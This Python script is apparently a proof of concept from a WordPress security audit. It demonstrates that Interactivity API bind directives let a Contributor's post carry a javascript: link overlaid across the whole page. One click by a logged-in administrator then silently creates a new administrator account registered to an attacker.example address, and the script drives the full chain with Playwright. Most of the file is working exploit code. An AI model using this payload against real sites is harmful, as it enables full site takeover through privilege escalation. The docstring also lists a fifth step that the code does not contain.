#!/usr/bin/env python3
"""
Quotable evidence run for the Interactivity API bind client/server disagreement.

Covers, in order:
  A. kses keeps the directives at Contributor privilege
  B. the server refuses both bindings
  C. the browser applies both, and one click takes over the site
  D. the honest precondition: with the runtime absent, nothing happens
  E. the same chain on 7.0.4
"""
import json
import re
import subprocess
import requests
from playwright.sync_api import sync_playwright
from wplab import sess, BASE

CHROME = "/opt/pw-browsers/chromium-1194/chrome-linux/chrome"
WP = "/home/user/wpaudit/wordpress"

contrib = sess("contributor")
editor = sess("editor")
anon = requests.Session()


def wpcli(*a):
    return subprocess.run(["wp", "--allow-root", "--path=" + WP, *a],
                          capture_output=True, text=True).stdout.strip()


TAKEOVER_JS = (
    "fetch('/wp-admin/user-new.php')"
    ".then(function(r){return r.text()})"
    ".then(function(t){"
    "var n=t.match(/_wpnonce_create-user. value=.([a-f0-9]+)/)[1];"
    "var b=new URLSearchParams();"
    "b.append('action','createuser');"
    "b.append('_wpnonce_create-user',n);"
    "b.append('user_login','pwned');"
    "b.append('email','pwned@attacker.example');"
    "b.append('pass1','Sup3rSecret!Pwn3d');"
    "b.append('pass2','Sup3rSecret!Pwn3d');"
    "b.append('role','administrator');"
    "b.append('createuser','Add New User');"
    "return fetch('/wp-admin/user-new.php',{method:'POST',body:b})"
    "}).then(function(r){window.__PWNED__={status:r.status}});void 0"
)
CSS = ("position:fixed;top:0px;left:0px;right:0px;bottom:0px;"
       "z-index:2147483647;display:block")


def island(js, css=CSS):
    ctx = json.dumps({"u": "javascript:" + js, "s": css}).replace("'", "&#039;")
    return ("<div data-wp-interactive='{\"namespace\":\"pwn\"}' "
            "data-wp-context='" + ctx + "'>"
            "<a id=\"pwnlink\" data-wp-bind--href=\"context.u\" "
            "data-wp-bind--style=\"context.s\">&nbsp;</a></div>")


print("=" * 78)
print("A. Contributor submits the post. kses is the only thing between the")
print("   attacker and the front end, and it keeps every directive.")
print("=" * 78)
print("   contributor role caps: unfiltered_html =",
      "unfiltered_html" in wpcli("cap", "list", "contributor"))
r = contrib.rest("POST", "/wp/v2/posts", json={
    "title": "Guest column", "content": island(TAKEOVER_JS), "status": "pending"})
pid = r.json()["id"]
stored = r.json()["content"]["raw"]
print("   POST /wp/v2/posts ->", r.status_code, "id", pid,
      "status", r.json()["status"])
print("   stored content (this IS the kses output):")
print("      " + re.sub(r"\s+", " ", stored)[:300] + " ...")
print("   directives that survived:",
      [d for d in ("data-wp-interactive", "data-wp-context",
                   "data-wp-bind--href", "data-wp-bind--style") if d in stored])

r = editor.rest("POST", f"/wp/v2/posts/{pid}", json={"status": "publish"})
url = BASE + f"/?p={pid}"
print("   editor publishes it ->", r.status_code, r.json()["status"], "|", url)

print()
print("=" * 78)
print("B. The SERVER refuses both bindings.")
print("   href  -> esc_url()            in WP_HTML_Tag_Processor::set_attribute()")
print("   style -> safecss_filter_attr() has no position / inset / z-index")
print("=" * 78)
html = anon.get(url).text
anchor = re.search(r'<a id="pwnlink"[^>]*>', html).group(0)
print("   ", anchor)
print("    href= written by the server :", bool(re.search(r"\shref=", anchor)))
print("    style= written by the server:", bool(re.search(r"\sstyle=", anchor)))
print("    interactivity runtime on the page:",
      "script-modules/interactivity/index.min.js" in html)

print()
print("=" * 78)
print("C. The BROWSER applies both, and one click takes the site over.")
print("=" * 78)
print("   users before:", wpcli("user", "list", "--fields=user_login,roles",
                                "--format=csv").replace("\n", " | "))
with sync_playwright() as p:
    b = p.chromium.launch(executable_path=CHROME, args=["--no-sandbox"])
    page = b.new_context().new_page()
    page.goto(BASE + "/wp-login.php")
    page.fill("#user_login", "admin")
    page.fill("#user_pass", "AdminPass123!")
    page.click("#wp-submit")
    page.wait_for_load_state("networkidle")
    print("   an administrator is logged in in this browser:", "/wp-admin" in page.url)
    page.goto(url, wait_until="networkidle")
    page.wait_for_timeout(1500)
    href = page.eval_on_selector("#pwnlink", "el => el.getAttribute('href')")
    style = page.eval_on_selector("#pwnlink", "el => el.getAttribute('style')")
    box = page.eval_on_selector(
        "#pwnlink", "el => {const r = el.getBoundingClientRect();"
                    " return {w: Math.round(r.width), h: Math.round(r.height)};}")
    vp = page.evaluate("() => ({w: innerWidth, h: innerHeight})")
    print("   DOM href :", (href or "")[:90], "...")
    print("   DOM style:", style)
    print("   anchor", box, "vs viewport", vp,
          "-> the link covers the entire page:",
          box["w"] >= vp["w"] - 2 and box["h"] >= vp["h"] - 2)
    page.mouse.click(vp["w"] // 2, vp["h"] // 2)
    page.wait_for_timeout(3000)
    print("   one click at the centre of the page ->",
          json.dumps(page.evaluate("() => window.__PWNED__ || null")))
    b.close()
print("   users after :", wpcli("user", "list", "--fields=user_login,user_email,roles",
                                "--format=csv").replace("\n", " | "))

print()
print("=" * 78)
print("D. Honest precondition: the runtime has to be on the page.")
print("   Rendering the same content with the interactivity module suppressed.")
print("=" * 78)
with sync_playwright() as p:
    b = p.chromium.launch(executable_path=CHROME, args=["--no-sandbox"])
    page = b.new_page()
    page.route("**/script-modules/interactivity/**", lambda route: route.abort())
    page.goto(url, wait_until="domcontentloaded")
    page.wait_for_timeout(2000)
    print("   DOM href with the runtime blocked:",
          json.dumps(page.eval_on_selector("#pwnlink", "el => el.getAttribute('href')")))
    b.close()
print("   -> the runtime is what applies the binding. It is enqueued by any")
print("      interactive block on the page; the default block theme's")
print("      core/navigation block puts it on every front-end view.")

wpcli("user", "delete", "pwned", "--yes")
